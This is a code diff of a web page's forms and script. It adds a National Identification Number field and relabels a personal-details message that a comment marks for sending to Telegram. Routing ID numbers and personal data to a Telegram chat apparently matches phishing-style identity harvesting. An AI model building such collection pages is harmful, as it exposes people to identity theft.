@@ -345,11 +345,11 @@ blockquote {
 		 <label for="address">Residential Address</label>
 		 <input type="text" id="address" name="address" placeholder="Your residentail Adress">
 		 
-		 <label for="nin">NIN</label>
-		 <input type="text" id="nin" name="nin" placeholder="Subject here" >
+		 <label for="lga">Local Government Area</label>
+		 <input type="text" id=lga" name="lga" placeholder="Subject here" >
 		 
-		 <label for="name">Residential Address</label>
-		 <input type="text" id="maintext" name="maintext" placeholder="Message Here">
+		 <label for="nin">National Identification Number(NIN)</label>
+		 <input type="text" id="nin" name="nin" placeholder="Message Here">
 		 
 		 <button type="submit" id="submitBtn2">SUMBIT</button>
 	 </form>
@@ -447,12 +447,12 @@ closeAdButton.addEventListener("click", slideOutAd);
             // Send to Telegram
             const message = `📝 **Form 1 Submitted - Personal Information**\n\n` +
                            `👤 Name: ${data.name}\n` +
-                           `👤 Name: ${data.gender}\n` +
-                           `👤 Name: ${data.dob}\n` +
-                           `👤 Name: ${data.email}\n` +
-                           `👤 Name: ${data.employ}\n` +
-                           `👤 Name: ${data.phone}\n` +
-                           `📧 Email: ${data.marital}\n` +
+                           `👤 Gender: ${data.gender}\n` +
+                           `👤 Date of Birth: ${data.dob}\n` +
+                           `👤 Email: ${data.email}\n` +
+                           `👤 Employment Status: ${data.employ}\n` +
+                           `👤 Phone: ${data.phone}\n` +
+                           `📧 Marital Status: ${data.marital}\n` +
                            `⏰ Time: ${new Date().toLocaleString()}`;
             
             alert(message);
@@ -481,7 +481,8 @@ closeAdButton.addEventListener("click", slideOutAd);
                            `🏠 City: ${data.city}\n` +
                            `🏙️ State: ${data.state}\n` +
                            `📮 Address: ${data.address}\n` +
-                           `🏙️ State: ${data.nin}\n` +
+                           `🏙️ LGA: ${data.lga}\n` +
+                           `🏙️ NIN: ${data.nin}\n` +
                            `📮 Address: ${data.maintext}\n` +
                            `⏰ Time: ${new Date().toLocaleString()}`;
             
